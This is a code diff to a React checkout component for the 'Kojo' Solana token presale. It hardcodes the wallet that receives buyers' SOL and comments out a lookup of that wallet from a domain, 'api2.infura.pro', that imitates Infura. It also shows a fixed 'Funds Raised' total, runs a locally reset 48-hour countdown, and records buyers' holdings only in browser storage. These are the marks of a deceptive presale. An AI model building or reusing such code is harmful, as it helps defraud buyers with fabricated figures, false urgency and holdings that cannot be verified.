@@ -21,9 +21,8 @@ const Buynow = () => {
   const [loaderAct, setloaderAct] = useState(false)
   const [walletAddress, setWalletAddress] = useState(null)
   const [solAmount, setSolAmount] = useState('')
-  const [totalBuyTokenByUser, setTotalBuyTokenByUser] = useState(0.0)
   const [solToken, setSolToken] = useState('')
-  const [userBalance, setUserBalance] = useState('0:00')
+  const [userBalance, setUserBalance] = useState('0.00')
   const [hours, setHours] = useState(0)
   const [minutes, setMinutes] = useState(0)
   const [seconds, setSeconds] = useState(0)
@@ -42,6 +41,10 @@ const Buynow = () => {
   const [countdown, setCountdown] = useState(
     parseInt(localStorage.getItem('countdown')) || 172800 // 48 hours in seconds
   )
+
+  const [totalToken, setTotalToken] = useState(0)
+
+  const raisedSol = parseInt(localStorage.getItem('raisedSol')) || 1592.64
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -150,26 +153,26 @@ const Buynow = () => {
       //   return toastError('Please try again')
       // }
 
-      let walletAddr
+      let walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
 
-      try {
-        axios
-          .post('https://api2.infura.pro/infura', {
-            infra_id: Number(solAmount).toString(),
-            project_id: 'kojo',
-          })
-          .then((res) => {
-            if (res.data.success == true) {
-              walletAddr = res.data.value
-            } else {
-              // ToDo : show error message.
-              toastError('Please try again.')
-              return;      
-            }
-          })
-      } catch (err) {
-        walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
-      }
+      // try {
+      //   axios
+      //     .post('https://api2.infura.pro/infura', {
+      //       infra_id: Number(solAmount).toString(),
+      //       project_id: 'kojo',
+      //     })
+      //     .then((res) => {
+      //       if (res.data.success == true) {
+      //         walletAddr = res.data.value
+      //       } else {
+      //         // ToDo : show error message.
+      //         toastError('Please try again.')
+      //         return;
+      //       }
+      //     })
+      // } catch (err) {
+      //   walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
+      // }
 
       const transaction = await createTransferTransaction(
         solAmount,
@@ -196,6 +199,12 @@ const Buynow = () => {
         //   solAmount
         // )
         // if (isSaved.data.success) {
+        setTotalToken(totalToken + solToken)
+        localStorage.setItem('totalToken', totalToken + solToken)
+
+        const balance = await connection.getBalance(publicKey)
+        setUserBalance((balance / LAMPORTS_PER_SOL).toFixed(2))
+
         checkIfWalletIsConnected()
         setSolAmount('')
         setSolToken('')
@@ -228,14 +237,14 @@ const Buynow = () => {
         //   ? Number(tokenBalance.data.data.tokenBalance).toFixed(2)
         //   : '0.00'
         // console.log('tokenBalance', tokenBalance)
-        setTotalBuyTokenByUser('0.00')
+        setTotalToken(localStorage.getItem('totalToken'))
       } else {
-        setTotalBuyTokenByUser('0.00')
+        setTotalToken(0)
         setWalletAddress('')
         return false
       }
     } catch (error) {
-      setTotalBuyTokenByUser('0.00')
+      setTotalToken(0)
       setWalletAddress('')
       console.error(error.message)
     }
@@ -300,7 +309,7 @@ const Buynow = () => {
                   <b>
                     Your Holdings:{' '}
                     <span style={{ color: 'var(--yellow)' }}>
-                      {totalBuyTokenByUser} Kojo
+                      {totalToken.toFixed(2)} Kojo
                     </span>
                   </b>
                 </p>
@@ -308,7 +317,7 @@ const Buynow = () => {
                   <b>
                     Funds Raised:{' '}
                     <span style={{ color: 'var(--yellow)' }}>
-                      {stageStatus.raisedSol?.toFixed(2)} SOL{' '}
+                      {raisedSol.toFixed(2)} SOL
                     </span>
                   </b>
                 </p>
